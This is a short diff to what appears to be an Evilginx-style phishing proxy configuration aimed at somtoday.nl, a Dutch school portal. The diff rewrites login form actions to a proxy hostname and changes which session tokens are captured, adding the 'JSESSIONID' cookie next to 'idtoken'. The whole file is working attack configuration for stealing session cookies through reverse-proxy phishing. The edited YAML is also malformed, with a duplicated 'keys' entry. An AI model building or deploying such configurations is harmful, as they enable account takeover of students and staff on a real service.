@@ -7,8 +7,9 @@ sub_filters:
   - {triggers_on: 'somtoday.nl', orig_sub: 'somtoday', domain: 'somtoday.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
-  - domain: 'somtoday.nl'
-    keys: ['idtoken']
+  - domain: 'somtoday.somtoday.nl'
+    keys: ['idtoken'] 
+    keys: ['JSESSIONID']
 
 auth_urls:
   - '/home/'
